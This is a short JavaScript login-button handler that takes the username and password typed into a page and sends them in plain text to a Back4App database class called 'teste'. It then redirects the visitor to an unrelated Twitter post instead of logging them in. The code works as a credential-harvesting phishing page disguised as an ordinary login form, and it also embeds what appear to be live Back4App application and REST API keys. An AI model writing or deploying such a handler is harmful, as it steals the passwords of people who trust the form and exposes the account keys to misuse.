
const url = "https://parseapi.back4app.com/classes/teste";
const headers = {
    "Content-Type": "application/json",
    "X-Parse-Application-Id": "XrmKhHlwmz2nN4AVNTyVfshxz83n1yOmrzRvIp9r",
    "X-Parse-REST-API-Key": "UvTV9haf6SUHoa9QGijr8RgbSuF0x5TKrzPbVN6o",
}

document.getElementById('login').onclick = async (e) => {
    e.preventDefault();
    const user = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    await fetch(url, {
        method: 'POST',
        headers: headers,
        body: JSON.stringify({
            "username": user,
            "password": password
        })
    })

    window.location.href = "https://twitter.com/BikiniBBW/status/1263878813064130560";
}
